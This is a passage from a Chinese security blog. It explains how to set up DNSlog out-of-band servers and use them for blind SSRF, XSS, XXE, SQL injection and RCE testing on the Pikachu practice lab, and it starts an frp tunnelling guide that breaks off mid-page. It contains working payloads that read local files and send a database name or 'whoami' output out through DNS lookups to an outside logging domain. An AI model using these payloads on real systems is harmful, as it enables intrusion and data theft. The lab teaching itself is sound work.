快速搭建:</p><figure class="highlight awk"><table><tbody><tr><td class="code"><pre><span class="line">export GIT_SSL_NO_VERIFY=<span class="number">0</span></span><br><span class="line">git clone http:<span class="regexp">//g</span>hproxy.com<span class="regexp">/https:/</span><span class="regexp">/github.com/</span>sudosammy/knary.git</span><br><span class="line"><span class="comment"># 编辑docker-compose.yaml的信息</span></span><br><span class="line">vim docker-compose.yaml</span><br></pre></td></tr></tbody></table></figure><p>环境变量信息有两种配置方式，一种是利用当目前的.env文件，一种是直接配置环境变量environment,也可以混合来用，我这里先配置下CANARY_DOMAIN=CANARY_DOMAIN=log.xxxx.xxx</p><figure class="highlight dts"><table><tbody><tr><td class="code"><pre><span class="line"><span class="symbol">version:</span> <span class="string">"3.9"</span></span><br><span class="line"><span class="symbol">services:</span></span><br><span class="line"><span class="symbol">  knary:</span></span><br><span class="line"><span class="symbol">    container_name:</span> knary</span><br><span class="line"><span class="symbol">    hostname:</span> knary</span><br><span class="line"><span class="symbol">    restart:</span> always</span><br><span class="line"><span class="symbol">    env_file:</span></span><br><span class="line">      - .env <span class="meta"># as commented below, you can also use the `environment` key to specify variables. This will overwrite anything in `env_file`</span></span><br><span class="line">    <span class="meta"># environment:</span></span><br><span class="line">    <span class="meta">#   - DNS=true</span></span><br><span class="line">    <span class="meta">#   - HTTP=true</span></span><br><span class="line">    <span class="meta">#   - BIND_ADDR=127.0.0.1</span></span><br><span class="line">       - CANARY_DOMAIN=log.log4j2.ga</span><br><span class="line">    <span class="meta"># (etc. etc.)</span></span><br><span class="line"><span class="symbol">    build:</span> .</span><br><span class="line"><span class="symbol">    ports:</span></span><br><span class="line">      - <span class="string">"80:80"</span></span><br><span class="line">      - <span class="string">"443:443"</span></span><br><span class="line">      - <span class="string">"53:53/udp"</span></span><br><span class="line"><span class="symbol">    volumes:</span></span><br><span class="line">      - ./certs:<span class="meta-keyword">/certs/</span></span><br></pre></td></tr></tbody></table></figure><p>编辑一份环境变量:</p><figure class="highlight routeros"><table><tbody><tr><td class="code"><pre><span class="line">vim .env</span><br><span class="line"><span class="comment"># 内容</span></span><br><span class="line"><span class="comment"># RENAME ME TO .env</span></span><br><span class="line"><span class="attribute">DNS</span>=<span class="literal">true</span></span><br><span class="line"><span class="attribute">HTTP</span>=<span class="literal">true</span></span><br><span class="line"><span class="attribute">BIND_ADDR</span>=0.0.0.0</span><br><span class="line"><span class="attribute">CANARY_DOMAIN</span>=log.log4j.ga</span><br><span class="line"><span class="attribute">LETS_ENCRYPT</span>=xxxxx@qq.com</span><br><span class="line"><span class="attribute">EXT_IP</span>=1x1.xxx.1xx.x3</span><br><span class="line"><span class="attribute">DEBUG</span>=<span class="literal">true</span></span><br><span class="line"><span class="attribute">LOG_FILE</span>=knary.log</span><br></pre></td></tr></tbody></table></figure><p>有两种方法，快速配置HTTPS证书:</p><p>1)自签名证书</p><p>当前目录创建一个cert文件夹</p><p><code>mkdir certs</code><br>openssl创建证书</p><p><code>sudo openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout ./certs/selfsigned.key -out ./certs/knary.crt</code><br>信息可以随意填</p><p>2)Let’s Encrypt 免费https，Kanry自带，只需要配置好邮箱即可，推荐使用这种!</p><p>docker-compose启动</p><figure class="highlight awk"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment"># 卸载原先docker</span></span><br><span class="line">apt-get remove -y remove docker</span><br><span class="line"><span class="comment"># 安装最新docker</span></span><br><span class="line">curl -fsSL https:<span class="regexp">//g</span>et.docker.com | bash -s docker --mirror Aliyun</span><br><span class="line"><span class="comment"># 安装docker-compose</span></span><br><span class="line">sudo curl -L </span><br><span class="line"><span class="string">"https://ghproxy.com/https://github.com/docker/compose/releases/download/v2.2.2/docker-compose-$(uname -s)-$(uname -m)"</span> -o <span class="regexp">/usr/</span>bin/docker-compose</span><br><span class="line">sudo chmod +x <span class="regexp">/usr/</span>bin/docker-compose</span><br></pre></td></tr></tbody></table></figure><p>Ubuntu构建过程可能会报错,修改/etc/resolv.conf的值为这个即可</p><figure class="highlight apache"><table><tbody><tr><td class="code"><pre><span class="line"><span class="attribute">nameserver</span> <span class="number">8.8.8.8</span></span><br><span class="line"><span class="attribute">nameserver</span> <span class="number">114.114.114.114</span></span><br><span class="line"><span class="attribute">nameserver</span> <span class="number">127.0.0.53</span></span><br><span class="line"><span class="attribute">nameserver</span> <span class="number">223.5.5.5</span></span><br><span class="line"><span class="attribute"><span class="nomarkup">options</span></span> edns<span class="number">0</span></span><br></pre></td></tr></tbody></table></figure><p>如果出现不生效可以参考：<br><a href="https://blog.csdn.net/booklijian/article/details/116491288?spm=1001.2101.3001.6661.1&amp;utm_medium=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~default-1.no_search_link&amp;depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~default-1.no_search_link&amp;utm_relevant_index=1">https://blog.csdn.net/booklijian/article/details/116491288?spm=1001.2101.3001.6661.1&amp;utm_medium=distribute.pc_relevant_t0.none-task-blog-2%7Edefault%7ECTRLIST%7Edefault-1.no_search_link&amp;depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2%7Edefault%7ECTRLIST%7Edefault-1.no_search_link&amp;utm_relevant_index=1</a></p><p>为了兼容国内VPS还需要修改Dockerfile添加Golang代理,要不然go get会失败:</p><p><code>RUN export GOPROXY=https://goproxy.io &amp;amp;&amp;amp; go get .</code></p><h3 id="Hyuga"><a href="#Hyuga" class="headerlink" title="Hyuga"></a>Hyuga</h3><p><strong>git下载</strong></p><figure class="highlight awk"><table><tbody><tr><td class="code"><pre><span class="line">git clone https:<span class="regexp">//gi</span>thub.com<span class="regexp">/Buzz2d0/</span>Hyuga.git</span><br><span class="line">cd Hyuga</span><br></pre></td></tr></tbody></table></figure><p><strong>修改config.xml文件</strong></p><p>main中填写自己的域名（比如是log.xxx.xx）<br>修改对应的ns为自己的ns域名(比如ns.xxx.xx)</p><p><strong>Docker快速组建</strong>:</p><figure class="highlight ebnf"><table><tbody><tr><td class="code"><pre><span class="line"><span class="attribute">docker-compose build</span></span><br><span class="line"><span class="attribute">docker-compose up -d</span></span><br></pre></td></tr></tbody></table></figure><p><strong>成功后如官网demo所示</strong></p><p><img src="/2022/01/06/DNSlog%E5%B7%A5%E5%85%B7%E5%8E%9F%E7%90%86%E6%90%AD%E5%BB%BA%E5%8F%8A%E4%BD%BF%E7%94%A8/54f1e34e946e45fb84321915135eecb4.png"></p><h3 id="Interactsh"><a href="#Interactsh" class="headerlink" title="Interactsh"></a>Interactsh</h3><ol><li>手工搭建</li></ol><p>安装Golang 1.16.1环境:</p><figure class="highlight vim"><table><tbody><tr><td class="code"><pre><span class="line">apt-<span class="built_in">get</span> <span class="keyword">update</span></span><br><span class="line">apt-<span class="built_in">get</span> -<span class="keyword">y</span> upgrade</span><br><span class="line">apt install  -<span class="keyword">y</span> gcc</span><br><span class="line"><span class="built_in">mkdir</span> tmp</span><br><span class="line"><span class="keyword">cd</span> /tmp</span><br><span class="line">wget http<span class="variable">s:</span>//<span class="keyword">dl</span>.google.<span class="keyword">com</span>/<span class="keyword">go</span>/go1.<span class="number">16.1</span>.linux-amd64.tar.gz</span><br><span class="line">tar -xvf go1.<span class="number">16.1</span>.linux-amd64.tar.gz </span><br><span class="line">mv <span class="keyword">go</span> /usr/local/</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"export GOROOT=/usr/local/go"</span> &gt;&gt;  ~/.<span class="keyword">profile</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"export GOPATH=$HOME/go"</span> &gt;&gt;  ~/.<span class="keyword">profile</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"export PATH=$GOPATH/bin:$GOROOT/bin:$PATH"</span> &gt;&gt; ~/.<span class="keyword">profile</span></span><br><span class="line"><span class="keyword">source</span> ~/.<span class="keyword">profile</span></span><br></pre></td></tr></tbody></table></figure><p>安装Interachsh Server</p><p><code>go get -v github.com/projectdiscovery/interactsh/cmd/interactsh-server@latest</code></p><ol start="2"><li>docker搭建</li></ol><p><code>docker run projectdiscovery/interactsh-server:latest -domain log.log4j.ga</code></p><h2 id="SSRF盲打"><a href="#SSRF盲打" class="headerlink" title="SSRF盲打"></a>SSRF盲打</h2><p><strong>靶场实例练习</strong></p><ol><li><p> Pikachu 靶场一个 SSRF 漏洞 实例：<br><img src="/2022/01/06/DNSlog%E5%B7%A5%E5%85%B7%E5%8E%9F%E7%90%86%E6%90%AD%E5%BB%BA%E5%8F%8A%E4%BD%BF%E7%94%A8/ea6c8be436114ee99ff42e649ffff42c.png"></p></li><li><p>点击链接发现发现它通过一个 url 参数传递了一个 URL 给后台并读取文件（可能靶场环境问题此处没成功读取到诗歌文件url=<a href="http://127.0.0.1/lab/vul/ssrf/ssrf_info/info1.php%EF%BC%89%EF%BC%9A">http://127.0.0.1/lab/vul/ssrf/ssrf_info/info1.php）：</a><br><img src="/2022/01/06/DNSlog%E5%B7%A5%E5%85%B7%E5%8E%9F%E7%90%86%E6%90%AD%E5%BB%BA%E5%8F%8A%E4%BD%BF%E7%94%A8/a47c976b53034e14a22c828833474bc7.png"></p></li><li><p>修改 url 参数为如下，可借助 SSRF 漏洞进行内网端口探测：<br><code>url=http://127.0.0.1:3306</code><br><img src="/2022/01/06/DNSlog%E5%B7%A5%E5%85%B7%E5%8E%9F%E7%90%86%E6%90%AD%E5%BB%BA%E5%8F%8A%E4%BD%BF%E7%94%A8/bbb23c4f1d88405e8a1b3824b890d68d.png"></p></li><li><p>修改 url 参数为如下，可借助 SSRF 漏洞读取本地文件：</p></li></ol><p><code>url=file:///C:/Windows/system32/drivers/etc/hosts</code><br><img src="/2022/01/06/DNSlog%E5%B7%A5%E5%85%B7%E5%8E%9F%E7%90%86%E6%90%AD%E5%BB%BA%E5%8F%8A%E4%BD%BF%E7%94%A8/4bbeb421854443e9b1f3d76da81680a9.png"></p><ol start="5"><li>在 DNSlog 平台申请一个子域名,然后访问 ?url=<a href="http://8b7b7d7c.log.xxx.cf，如下：">http://8b7b7d7c.log.xxx.cf，如下：</a><br><img src="/2022/01/06/DNSlog%E5%B7%A5%E5%85%B7%E5%8E%9F%E7%90%86%E6%90%AD%E5%BB%BA%E5%8F%8A%E4%BD%BF%E7%94%A8/98f06710ee98419ab6a11698cc486c3c.png"><br><img src="/2022/01/06/DNSlog%E5%B7%A5%E5%85%B7%E5%8E%9F%E7%90%86%E6%90%AD%E5%BB%BA%E5%8F%8A%E4%BD%BF%E7%94%A8/637505a9ae31421d910772f782ef0bb2.png"></li></ol><h2 id="XSS的盲打"><a href="#XSS的盲打" class="headerlink" title="XSS的盲打"></a>XSS的盲打</h2><p>在实战中能真正能构成致命性损伤的 XSS 类型就是储存型 XSS，一般是从前台打到后台，一般反射型 XSS 我们常见做法一般是给自己弹个 alert 就可以知道这个语句有没有执行，有没有被屏蔽。但是前台打到后台的储存型盲打 XSS 我们肯定是不可能通过 alert 去验证漏洞是否存在。弹 alert 必然是要惊动管理员，况且就算在后台弹窗了，我们也看不到。</p><p>，比如说这有个留言框，我们输入个 Payload 如下：<br><code>好的管理员！&lt;script src=http://testxss.a.com&gt;&lt;/script&gt;</code></p><p>因为 script 标签的 src 是在加载后就自动去请求的，并且 http 协议仍然会用到 dns 协议，当管理员从留言板看到这条消息的时候浏览器就会自动去请求 <a href="http://testxss.a.com,这样子的话,就会在/">http://testxss.a.com，这样子的话，就会在</a> DNSlog 里留下如下记录：<br><code>testxss.a.com 10.0.0.0</code></p><p>当我们在 dnslog 里看到了这条记录的时候，就说明盲打 XSS 存在了。</p><h3 id="靶场-XSS-盲打实例"><a href="#靶场-XSS-盲打实例" class="headerlink" title="靶场 XSS 盲打实例"></a>靶场 XSS 盲打实例</h3><ol><li><p>以 Pikachu 靶场的一个 XSS 漏洞环境为例：<br><img src="/2022/01/06/DNSlog%E5%B7%A5%E5%85%B7%E5%8E%9F%E7%90%86%E6%90%AD%E5%BB%BA%E5%8F%8A%E4%BD%BF%E7%94%A8/667c816c06d04b7ba7547c28c3aa6a33.png"></p></li><li><p>插入 <code>&lt;script&gt;alert(1)&lt;/script&gt;</code>即可触发弹窗：<br><img src="/2022/01/06/DNSlog%E5%B7%A5%E5%85%B7%E5%8E%9F%E7%90%86%E6%90%AD%E5%BB%BA%E5%8F%8A%E4%BD%BF%E7%94%A8/159bad135ea6473fa8ed565b4937e352.png"></p></li><li><p>接下来插入<code>&lt;script src="http://8b7b7d7c.log.xxx.cf"&gt;&lt;/script&gt;</code>：<br><img src="/2022/01/06/DNSlog%E5%B7%A5%E5%85%B7%E5%8E%9F%E7%90%86%E6%90%AD%E5%BB%BA%E5%8F%8A%E4%BD%BF%E7%94%A8/e5935cf029724774baa71edf9ca494c7.png"></p></li><li><p>可以在 DNSlog 平台看到对应的请求记录：<br><img src="/2022/01/06/DNSlog%E5%B7%A5%E5%85%B7%E5%8E%9F%E7%90%86%E6%90%AD%E5%BB%BA%E5%8F%8A%E4%BD%BF%E7%94%A8/4afa529d82514d888d422f4eaa8c624a.png"><br>此处的 Payload 使用<code>&lt;img src="http://8b7b7d7c.log.xxx.cf"&gt;</code>也可以</p></li></ol><h3 id="XXE的盲打"><a href="#XXE的盲打" class="headerlink" title="XXE的盲打"></a>XXE的盲打</h3><p>对于没有回显的 XXE 漏洞，同样可以使用 DNSlog 平台进行漏洞检测。</p><p><strong>XXE 盲打靶场实例</strong></p><ol><li>以 Pikachu 靶场的 XXE 漏洞环境为例：</li></ol><p><img src="/2022/01/06/DNSlog%E5%B7%A5%E5%85%B7%E5%8E%9F%E7%90%86%E6%90%AD%E5%BB%BA%E5%8F%8A%E4%BD%BF%E7%94%A8/4409393bb40649a1813f1956b9c195f6.png"></p><ol start="2"><li>先构建常规测试 Payload：<figure class="highlight xml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version = "1.0"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">note</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="meta-keyword">hacker</span> <span class="meta-string">"Tr0e"</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span><span class="symbol">&amp;hacker;</span><span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><img src="/2022/01/06/DNSlog%E5%B7%A5%E5%85%B7%E5%8E%9F%E7%90%86%E6%90%AD%E5%BB%BA%E5%8F%8A%E4%BD%BF%E7%94%A8/41061dd9b1df4c79942605e4dde0b822.png"></li><li>借助 XXE 漏洞构造读取本地文件的 Payload：<figure class="highlight xml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">foo</span> [    </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///c:/windows/win.ini"</span> &gt;</span> ]&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">foo</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure></li></ol><p><img src="/2022/01/06/DNSlog%E5%B7%A5%E5%85%B7%E5%8E%9F%E7%90%86%E6%90%AD%E5%BB%BA%E5%8F%8A%E4%BD%BF%E7%94%A8/deca0b4f301d4e03a5f2c24ad94042eb.png"></p><ol start="4"><li>假设这是一个 XXE 无回显的漏洞，或者说不清楚服务器是什么操作系统、不清楚文件组成，可以构造如下 DNSlog 相关的 Payload：</li></ol><!--?xml version="1.0"?--><p> ]&gt;<br><foo>&amp;xxe;</foo></p><p><img src="/2022/01/06/DNSlog%E5%B7%A5%E5%85%B7%E5%8E%9F%E7%90%86%E6%90%AD%E5%BB%BA%E5%8F%8A%E4%BD%BF%E7%94%A8/4345c781e8fd48329ccd63b77bd59834.png"></p><h2 id="SQL的盲注"><a href="#SQL的盲注" class="headerlink" title="SQL的盲注"></a>SQL的盲注</h2><p>不论是布尔型盲注还是时间型盲注，都需要频繁的跑请求才能够获取数据库中的值，在现代 WAF 的防护下，很可能导致 IP 被 ban。我们可以结合 DNSlog 完美快速的将数据取出。如遇到 MySql 的盲注时，可以利用内置函数 load_file() 来完成 DNSlog，load_file()不仅能够加载本地文件，同时也能对诸如 \<a href="http://www.test.com/">www.test.com</a> 这样的URL发起请求。</p><p><strong>SQL盲注靶场实例</strong></p><ol><li><p>下面同样以 Pikachu 靶场的 SQL 盲注（布尔型）漏洞环境为例：<br><img src="/2022/01/06/DNSlog%E5%B7%A5%E5%85%B7%E5%8E%9F%E7%90%86%E6%90%AD%E5%BB%BA%E5%8F%8A%E4%BD%BF%E7%94%A8/c3dbc8b2254f4b8c83af148d48bb5ef5.png"></p></li><li><p>输入kobe’ and 1=1#可成功查询：<br><img src="/2022/01/06/DNSlog%E5%B7%A5%E5%85%B7%E5%8E%9F%E7%90%86%E6%90%AD%E5%BB%BA%E5%8F%8A%E4%BD%BF%E7%94%A8/2c9f9344e113416a8c7c53ce308a7573.png"></p></li><li><p>输入kobe’ and 1=2#查询失败:<br><img src="/2022/01/06/DNSlog%E5%B7%A5%E5%85%B7%E5%8E%9F%E7%90%86%E6%90%AD%E5%BB%BA%E5%8F%8A%E4%BD%BF%E7%94%A8/9b6fbbade3504547a14c750f04b9dafc.png"></p></li><li><p>输入利用 DNSlog 回显数据库名称的 Payload：<br><code>?id=1' and load_file(concat('\\\\',(select database()),'.stzi44.dnslog.cn\\abc'))--+</code></p></li></ol><p>注：dnslog注入只能用于windows，因为load_file这个函数的主要目的还是读取本地的文件，所以我们在拼接的时候需要在前面加上两个//，这两个斜杠的目的是为了使用load_file可以查询的unc路径。但是Linux服务器没有unc路径，也就无法使用dnslog注入</p><h2 id="RCE的盲打"><a href="#RCE的盲打" class="headerlink" title="RCE的盲打"></a>RCE的盲打</h2><table><thead><tr><th>操作系统</th><th>盲注方式</th></tr></thead><tbody><tr><td>windows</td><td>%variable%</td></tr><tr><td>linux</td><td>反引号 variable 反引号</td></tr></tbody></table><p>windows  Payload：</p><p><code>%OS%.8b7b7d7c.log.xxx.cf</code><br><img src="/2022/01/06/DNSlog%E5%B7%A5%E5%85%B7%E5%8E%9F%E7%90%86%E6%90%AD%E5%BB%BA%E5%8F%8A%E4%BD%BF%E7%94%A8/f46eafd6692b40d8ba820c54fa582818.png"></p><p><strong>windows常用变量</strong></p><figure class="highlight awk"><table><tbody><tr><td class="code"><pre><span class="line"><span class="regexp">//</span>变量                 类型       描述</span><br><span class="line"><span class="regexp">//</span>%ALLUSERSPROFILE%   本地       返回“所有用户”配置文件的位置。</span><br><span class="line"><span class="regexp">//</span>%APPDATA%           本地       返回默认情况下应用程序存储数据的位置。</span><br><span class="line"><span class="regexp">//</span>%CD%                                                        本地       返回当前目录字符串。</span><br><span class="line"><span class="regexp">//</span>%CMDCMDLINE%        本地       返回用来启动当前的 Cmd.exe 的准确命令行。</span><br><span class="line"><span class="regexp">//</span>%CMDEXTVERSION%     系统       返回当前的“命令处理程序扩展”的版本号。</span><br><span class="line"><span class="regexp">//</span>%COMPUTERNAME%      系统       返回计算机的名称。</span><br><span class="line"><span class="regexp">//</span>%COMSPEC%           系统       返回命令行解释器可执行程序的准确路径。</span><br><span class="line"><span class="regexp">//</span>%DATE%              系统       返回当前日期。使用与 date /t 命令相同的格式。由 Cmd.exe 生成。有关 date 命令的详细信息，请参阅 Date。</span><br><span class="line"><span class="regexp">//</span>%ERRORLEVEL%        系统       返回上一条命令的错误代码。通常用非零值表示错误。</span><br><span class="line"><span class="regexp">//</span>%HOMEDRIVE%         系统       返回连接到用户主目录的本地工作站驱动器号。基于主目录值而设置。用户主目录是在“本地用户和组”中指定的。</span><br><span class="line"><span class="regexp">//</span>%HOMEPATH%          系统       返回用户主目录的完整路径。基于主目录值而设置。用户主目录是在“本地用户和组”中指定的。</span><br><span class="line"><span class="regexp">//</span>%HOMESHARE%         系统       返回用户的共享主目录的网络路径。基于主目录值而设置。用户主目录是在“本地用户和组”中指定的。</span><br><span class="line"><span class="regexp">//</span>%LOGONSERVER%       本地       返回验证当前登录会话的域控制器的名称。</span><br><span class="line"><span class="regexp">//</span>%NUMBER_OF_PROCESSORS%         系统      指定安装在计算机上的处理器的数目。</span><br><span class="line"><span class="regexp">//</span>%OS%                           系统      返回操作系统名称。Windows <span class="number">2000</span> 显示其操作系统为 Windows_NT。</span><br><span class="line"><span class="regexp">//</span>%PATH%                         系统       指定可执行文件的搜索路径。</span><br><span class="line"><span class="regexp">//</span>%PATHEXT%                      系统       返回操作系统认为可执行的文件扩展名的列表。</span><br><span class="line"><span class="regexp">//</span>%PROCESSOR_ARCHITECTURE%       系统       返回处理器的芯片体系结构。值：x86 或 IA64（基于 Itanium）。</span><br><span class="line"><span class="regexp">//</span>%PROCESSOR_IDENTFIER%          系统       返回处理器说明。</span><br><span class="line"><span class="regexp">//</span>%PROCESSOR_LEVEL%              系统       返回计算机上安装的处理器的型号。</span><br><span class="line"><span class="regexp">//</span>%PROCESSOR_REVISION%           系统       返回处理器的版本号。</span><br><span class="line"><span class="regexp">//</span>%PROMPT%                       本地       返回当前解释程序的命令提示符设置。由 Cmd.exe 生成。</span><br><span class="line"><span class="regexp">//</span>%RANDOM%                       系统       返回 <span class="number">0</span> 到 <span class="number">32767</span> 之间的任意十进制数字。由 Cmd.exe 生成。</span><br><span class="line"><span class="regexp">//</span>%SYSTEMDRIVE%                  系统       返回包含 Windows server operating system 根目录（即系统根目录）的驱动器。</span><br><span class="line"><span class="regexp">//</span>%SYSTEMROOT%                   系统       返回 Windows server operating system 根目录的位置。</span><br><span class="line"><span class="regexp">//</span>%TEMP%和%TMP%                  系统和用户 返回对当前登录用户可用的应用程序所使用的默认临时目录。有些应用程序需要 TEMP，而其他应用程序则需要 TMP。</span><br><span class="line"><span class="regexp">//</span>%TIME%                         系统       返回当前时间。使用与time /t命令相同的格式。由Cmd.exe生成。有关time命令的详细信息，请参阅 Time。</span><br><span class="line"><span class="regexp">//</span>%USERDOMAIN%                   本地       返回包含用户帐户的域的名称。</span><br><span class="line"><span class="regexp">//</span>%USERNAME%                     本地       返回当前登录的用户的名称。</span><br><span class="line"><span class="regexp">//</span>%USERPROFILE%                  本地       返回当前用户的配置文件的位置。</span><br><span class="line"><span class="regexp">//</span>%WINDIR%                       系统       返回操作系统目录的位置。</span><br></pre></td></tr></tbody></table></figure><p>如果是 Linux 环境，则 Payload 对应的应该为：</p><figure class="highlight apache"><table><tbody><tr><td class="code"><pre><span class="line"><span class="attribute">ping</span> `whoami`.<span class="number">8</span>b<span class="number">7</span>b<span class="number">7</span>d<span class="number">7</span>c.log.xxx.cf</span><br></pre></td></tr></tbody></table></figure><p>参考：<br><a href="https://bbs.ichunqiu.com/thread-61037-1-1.html">https://bbs.ichunqiu.com/thread-61037-1-1.html</a><br><a href="https://www.jianshu.com/p/0c1c23d80098">https://www.jianshu.com/p/0c1c23d80098</a><br><a href="https://cloud.tencent.com/developer/news/221937">https://cloud.tencent.com/developer/news/221937</a><br><a href="https://github.com/ADOOO/DnslogSqlinj">https://github.com/ADOOO/DnslogSqlinj</a><br><a href="https://idc.wanyunshuju.com/aqst/1889.html">https://idc.wanyunshuju.com/aqst/1889.html</a><br><a href="https://www.cnblogs.com/Chorder/p/9087386.html">https://www.cnblogs.com/Chorder/p/9087386.html</a><br><a href="https://www.jianshu.com/p/721b49c95d98">https://www.jianshu.com/p/721b49c95d98</a><br><a href="https://forum.butian.net/share/1055">https://forum.butian.net/share/1055</a><br><a href="https://blog.csdn.net/qq_43416157/article/details/116788106">https://blog.csdn.net/qq_43416157/article/details/116788106</a><br><a href="https://cloud.tencent.com/developer/article/1710514">https://cloud.tencent.com/developer/article/1710514</a><br><a href="https://blog.csdn.net/booklijian/article/details/116491288?spm=1001.2101.3001.6661.1&amp;utm_medium=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~default-1.no_search_link&amp;depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~default-1.no_search_link&amp;utm_relevant_index=1">https://blog.csdn.net/booklijian/article/details/116491288?spm=1001.2101.3001.6661.1&amp;utm_medium=distribute.pc_relevant_t0.none-task-blog-2%7Edefault%7ECTRLIST%7Edefault-1.no_search_link&amp;depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2%7Edefault%7ECTRLIST%7Edefault-1.no_search_link&amp;utm_relevant_index=1</a><br><a href="https://blog.csdn.net/weixin_39190897/article/details/117197126">https://blog.csdn.net/weixin_39190897/article/details/117197126</a></p>]]></content>
      
      
      <categories>
          
          <category> 安全工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DNSlog </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>frp内网穿透</title>
      <link href="/2021/12/26/frp%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/"/>
      <url>/2021/12/26/frp%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/</url>
      
        <content type="html"><![CDATA[<h1 id="FRP内网穿透"><a href="#FRP内网穿透" class="headerlink" title="FRP内网穿透"></a>FRP内网穿透</h1><p>1.公网服务器一台（腾讯云、阿里云等皆可）<br>2.内网服务器一台（自己的电脑也行）<br>3.frp安装包</p><h2 id="0x01-下载准备"><a href="#0x01-下载准备" class="headerlink" title="0x01 下载准备"></a>0x01 下载准备</h2><p>查看服务器架构<br>公网服务器架构：<br><img src="/2021/12/26/frp%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/99c59638e87d4e13b38a0dc34f0667d3.png"></p><p>内网服务器架构<br><img src="/2021/12/26/frp%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/2712d9c16ad344bf9516f27158d071d0.png"></p><p>选择合适的安装包下载<br><a href="https://github.com/fatedier/frp/releases">https://github.com/fatedier/frp/releases</a></p><p>分别下载liunx_amd64和linux_arm的包</p><h2 id="0x02-公网服务器配置"><a href="#0x02-公网服务器配置" class="headerlink" title="0x02 公网服务器配置"></a>0x02 公网服务器配置</h2><p><strong>解压安装包</strong></p><blockquote><p>公网服务器的安装包：frp_0.38.0_linux_amd64.tar.gz</p></blockquote><figure class="highlight apache"><table><tbody><tr><td class="code"><pre><span class="line"><span class="attribute">tar</span> -zxvf frp_<span class="number">0</span>.<span class="number">38</span>.<span class="number">0</span>_linux_amd<span class="number">64</span>.tar.gz</span><br><span class="line"></span><br><span class="line"><span class="attribute">cd</span> frp_<span class="number">0</span>.<span class="number">38</span>.<span class="number">0</span>_linux_amd<span class="number">64</span></span><br></pre></td></tr></tbody></table></figure><p><img src="/2021/12/26/frp%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/8129a2860b19428fb8e1ab2f998358c0.png"></p><p><strong>授予文件权限</strong></p><figure class="highlight apache"><table><tbody><tr><td class="code"><pre><span class="line"><span class="attribute">chmod</span> +<span class="number">755</span> frps</span><br><span class="line"><span class="attribute">chmod</span> +<span class="number">755</span> frps.ini</span><br></pre></td></tr></tbody></table></figure><p><strong>修改配置文件</strong><br>在配置文件中加入一句token = 密码，注意这是明文密码，不要输入自己常用的密码</p><figure class="highlight axapta"><table><tbody><tr><td class="code"><pre><span class="line">vim frps.<span class="built_in">int</span></span><br><span class="line"><span class="meta">#---------------修改内容为------------</span></span><br><span class="line">[<span class="keyword">common</span>]                         </span><br><span class="line">bind_port = <span class="number">7008</span></span><br><span class="line">token = howareyou</span><br></pre></td></tr></tbody></table></figure><p>然后保存退出</p><p>云产品，所以要手动修改安全组规则开放frp服务端7008端口和自己准备映射的端口</p><p><img src="/2021/12/26/frp%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/ccf2a8b8804441ffbfb3a6fae099dfbd.png"></p><p><strong>运行</strong><br><code>./frps -c ./frps.ini &amp;</code></p><p>注意：先运行公网服务器端，再运行内网服务器端。此种运行方式输入前台运行，如需不挂断运行可使用screen或nohup命令</p><h2 id="0x03-内网服务器端配置"><a href="#0x03-内网服务器端配置" class="headerlink" title="0x03 内网服务器端配置"></a>0x03 内网服务器端配置</h2><h3 id="解压安装包"><a href="#解压安装包" class="headerlink" title="解压安装包"></a>解压安装包</h3><blockquote><p>内网服务器是arm架构的，所以下载frp_0.38.0_linux_arm.tar.gz</p></blockquote><figure class="highlight apache"><table><tbody><tr><td class="code"><pre><span class="line"><span class="attribute">tar</span> -zxvf frp_<span class="number">0</span>.<span class="number">38</span>.<span class="number">0</span>_linux_arm.tar.gz</span><br><span class="line"><span class="attribute">cd</span> frp_<span class="number">0</span>.<span class="number">38</span>.<span class="number">0</span>_linux_arm</span><br></pre></td></tr></tbody></table></figure><h3 id="授予文件权限"><a href="#授予文件权限" class="headerlink" title="授予文件权限"></a>授予文件权限</h3><figure class="highlight apache"><table><tbody><tr><td class="code"><pre><span class="line"><span class="attribute">chmod</span> +<span class="number">755</span> frpc</span><br><span class="line"><span class="attribute">chmod</span> +<span class="number">755</span> frpc.ini</span><br></pre></td></tr></tbody></table></figure><h3 id="修改配置文件"><a href="#修改配置文件" class="headerlink" title="修改配置文件"></a>修改配置文件</h3><p>vim frpc.int<br><img src="/2021/12/26/frp%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/80a2e26d1b0d4b7397b1bbc78dbf46e7.png"></p><p><strong>.运行</strong><br> <code>./frpc -c ./frpc.ini &amp;</code><br><img 